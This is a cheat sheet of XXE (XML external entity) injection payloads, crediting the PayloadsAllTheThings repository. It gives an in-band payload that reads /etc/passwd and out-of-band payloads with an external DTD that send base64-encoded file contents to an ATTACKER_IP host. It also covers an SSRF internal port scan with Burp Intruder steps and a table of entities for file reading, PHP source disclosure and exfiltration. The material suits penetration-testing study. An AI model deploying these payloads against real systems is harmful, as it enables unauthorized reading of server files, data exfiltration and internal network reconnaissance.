## Resource: https://github.com/swisskyrepo/PayloadsAllTheThings

## XXE Injection

### In-Band XXE Injection Example payload:

      <!DOCTYPE foo [

      <!ELEMENT foo ANY >

      <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>

      <contact><name>&xxe;</name><email>test@mail.com</email><message>whatever</message></contact>

### Out-of-Band XXE Injection Example Payload:

      <!DOCTYPE foo [
      <!ELEMENT foo ANY >
      <!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
      <upload><file>&xxe;</file></upload>

### Create a payload named sample.dtd with the code below:

      <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
      <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
      %oobxxe;

### Final OOB Payload:

      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
      <upload>
    <file>&exfil;</file>
      </upload>

### Server-Side Request Forgey with XXE Injection Internal Port Scanning payload:

      <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
      ]>
      <contact>
        <name>&xxe;</name>
        <email>test@test.com</email>
        <message>test</message>
      </contact>

 - 1) Send this payload to Burp Intruder

 - 2) Select the port number in the localhost URI
  
 - 3) Go to payloads -> Select payload type: Numbers
  
 - 4) Payload Settings -> From 1 to 65535
  
 - 5) Start Attack

| **Code**   | **Description**   |
| --------------|-------------------|
| `<!ENTITY xxe SYSTEM "http://localhost/email.dtd">` | Define External Entity to a URL |
| `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Define External Entity to a file path |
| `<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">` | Read PHP source code with base64 encode filter |
| `<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">` | Reading a file through a PHP error |
| `<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">` | Reading a file OOB exfiltration |
